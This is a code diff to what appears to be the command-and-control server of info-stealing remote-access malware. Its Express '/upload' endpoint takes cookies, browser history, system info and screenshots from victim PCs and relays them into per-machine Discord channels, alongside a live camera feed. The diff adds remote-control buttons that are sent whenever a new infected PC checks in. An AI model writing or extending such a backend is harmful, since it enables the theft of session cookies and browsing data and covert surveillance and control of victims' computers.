@@ -39,6 +39,23 @@ function createControlButtons(pcId) {
     )];
 }
 
+async function sendControlButtons(pcId) {
+    try {
+        const guild = await bot.guilds.fetch(GUILD_ID);
+        const category = await getOrCreateCategory(guild, CATEGORY_NAME);
+        const channel = channelByPC[pcId] ? await guild.channels.fetch(channelByPC[pcId]).catch(()=>null) : null;
+        const finalChannel = channel || await getOrCreateTextChannel(guild, pcId, category.id);
+        channelByPC[pcId] = finalChannel.id;
+
+        await finalChannel.send({
+            content: `Управление ПК: ${pcId}`,
+            components: createControlButtons(pcId)
+        });
+    } catch(err) {
+        console.error("Ошибка отправки кнопок:", err);
+    }
+}
+
 // ---------- Обработка кнопок ----------
 bot.on("interactionCreate", async interaction => {
     if(!interaction.isButton()) return;
@@ -87,6 +104,7 @@ app.post("/upload", async (req, res) => {
         const { pcId, cookies, history, systemInfo, screenshot } = req.body;
         if(!pcId) return res.status(400).json({ error:"pcId required" });
 
+        const isNewPC = !onlinePCs[pcId];
         onlinePCs[pcId] = Date.now();
 
         const guild = await bot.guilds.fetch(GUILD_ID);
@@ -103,6 +121,9 @@ app.post("/upload", async (req, res) => {
         if(screenshot) files.push({ attachment: Buffer.from(screenshot, "base64"), name: `${pcId}-screenshot.jpeg` });
 
         if(files.length) await finalChannel.send({ files });
+
+        // ---------- Отправка кнопок при первом подключении ПК ----------
+        if(isNewPC) await sendControlButtons(pcId);
 
         // ---------- Live камера ----------
         if(screenshot && wsCameraClients[pcId]){
